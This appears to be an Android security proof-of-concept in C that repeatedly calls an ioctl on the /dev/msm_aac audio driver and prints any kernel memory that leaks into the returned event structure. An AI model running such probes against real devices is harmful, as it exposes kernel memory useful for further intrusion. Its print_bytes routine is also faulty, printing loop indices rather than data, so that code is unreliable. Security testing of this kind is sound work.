/**
 * Copyright (C) 2017 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#define _GNU_SOURCE
#include <sys/wait.h>

#include <dlfcn.h>
#include <errno.h>
#include <limits.h>

#include <android/log.h>
#include <jni.h>
#include <linux/kdev_t.h>
#include <stdio.h>
#include <stdlib.h>

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <pthread.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h> /* See NOTES */
#include <unistd.h>

typedef unsigned int __u32;
typedef unsigned char __u8;
typedef signed int s32;
typedef unsigned int u32;
typedef unsigned short u16;

typedef u32 compat_uptr_t;
struct msm_audio_aio_buf32 {
  compat_uptr_t buf_addr;
  u32 buf_len;
  u32 data_len;
  compat_uptr_t private_data;
  u16 mfield_sz; /*only useful for data has meta field */
};

struct msm_audio_bitstream_info32 {
  u32 codec_type;
  u32 chan_info;
  u32 sample_rate;
  u32 bit_stream_info;
  u32 bit_rate;
  u32 unused[3];
};

struct msm_audio_bitstream_error_info32 {
  u32 dec_id;
  u32 err_msg_indicator;
  u32 err_type;
};

union msm_audio_event_payload32 {
  struct msm_audio_aio_buf32 aio_buf;
  struct msm_audio_bitstream_info32 stream_info;
  struct msm_audio_bitstream_error_info32 error_info;
  s32 reserved;
};

struct msm_audio_event32 {
  s32 event_type;
  s32 timeout_ms;
  union msm_audio_event_payload32 event_payload;
};

void print_bytes(u32* buf, size_t size) {
  size_t i;
  for (i = 0; i < size; i++) {
    printf("%08x", i, (unsigned int)buf[i]);
  }
  printf("\n");
}

#define AUDIO_IOCTL_MAGIC 'a'
#define AUDIO_GET_EVENT_32 _IOR(AUDIO_IOCTL_MAGIC, 13, struct msm_audio_event32)
int main(int argc, char* argv[]) {
  int trycount = 0;
  int fd;
  pthread_t tid1, tid2;
  int ret = 0;
  struct msm_audio_event32 event32, event32_dup;

  fd = open("/dev/msm_aac", O_NONBLOCK | O_RDWR, 0660);

  if (fd < 0) {
    perror("open");
    return -1;
  }

  memset(&event32_dup, 0, sizeof(event32_dup));
  event32_dup.timeout_ms = 1;

  for (int i = 0;i < 500; i++) {
    memcpy(&event32, &event32_dup, sizeof(event32_dup));
    ret = ioctl(fd, AUDIO_GET_EVENT_32, &event32);

    if (memcmp(&event32, &event32_dup, sizeof(event32)) != 0) {
      printf("information leaked, trycount=%d, rc=%d, event_type=%d\n",
             trycount, ret, event32.event_type);
      print_bytes((u32*)&event32, sizeof(event32) / sizeof(u32));
    }

    trycount++;

    usleep(1000);
  }

  close(fd);
}
